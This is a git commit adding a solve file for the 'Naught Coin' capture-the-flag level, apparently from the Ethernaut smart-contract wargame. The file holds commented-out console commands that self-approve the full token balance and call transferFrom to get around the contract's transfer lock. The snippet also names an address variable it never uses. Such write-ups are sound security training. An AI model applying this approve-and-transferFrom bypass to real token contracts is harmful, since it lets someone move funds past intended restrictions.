7c58bdc4a9ca2d54c64b7dfbe71058b1096a21c8
crypt0n <spencer_clay@foxmail.com>
2022-10-20 15:45:20 +0800

    add Naught Coin

---
+++ Naught Coin/solve.sol
@@ -0,0 +1,7 @@
+/*
+tmpAddr = "0xD768d8bf0679181b9a10b28a2f8Cf873A810A5a8"
+totalvalue='1000000000000000000000000'
+//给自己授权
+await contract.approve(player,totalvalue)
+await contract.transferFrom(player,secondaddr,totalvalue)   
+*/
